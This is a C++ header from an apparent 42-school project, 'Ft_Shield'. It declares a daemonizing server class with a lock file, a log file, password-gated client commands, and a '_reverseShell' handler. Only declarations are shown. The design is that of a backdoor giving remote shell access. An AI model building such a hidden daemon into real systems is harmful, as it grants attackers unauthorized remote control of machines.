/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   Ft_Shield.hpp                                      :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: halvarez <halvarez@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2023/10/21 17:31:46 by halvarez          #+#    #+#             */
/*   Updated: 2023/11/20 17:38:22 by halvarez         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef FT_SHIELD_HPP
#define FT_SHIELD_HPP 

#include <map>
#include <sys/socket.h>

/*
 * Ft_Shield class:
 */

class Ft_Shield
{
	public:
	/*---------- Constructors ----------------------*/
						Ft_Shield(void);
						Ft_Shield(const Ft_Shield & shield);
	/*---------- Destructor ------------------------*/
						~Ft_Shield(void);

		Ft_Shield &		operator=(const Ft_Shield & shield);

	/*---------- Public function members -----------*/
		void			daemonize(void);

	private:
	/*---------- Private typedef -------------------*/
	/*
	 * Create a std::map associating std::string with pointer function member
	 * to easily add functionnality
	 */
		typedef void (Ft_Shield::*t_fptr)(int);
		typedef std::map<std::string, t_fptr> t_commands;
	/*---------- Private attributes ----------------*/
		const int		_port;
		const int		_MaxClients;
		bool			_run;
		int				_maxfd;
		int				_lockFile;
		int				_logFile;
		int				_nClients;
		struct sockaddr	_addr;
		int				_socket;
		std::string		_buffer;
		t_commands		_cmdMap;

	/*---------- Private function members ----------*/
		void			_checkInstance(void);
		int				_mkSrv(void);
		void			_runSrv(void);
		void			_exit(void);
		void			_shutdown(int fd);
		void			_reverseShell(int fd);
		void			_disconnect(int fd);
		void			_help(int fd);
		int				_password(int fd);
};

#endif /* FT_SHIELD_HPP */
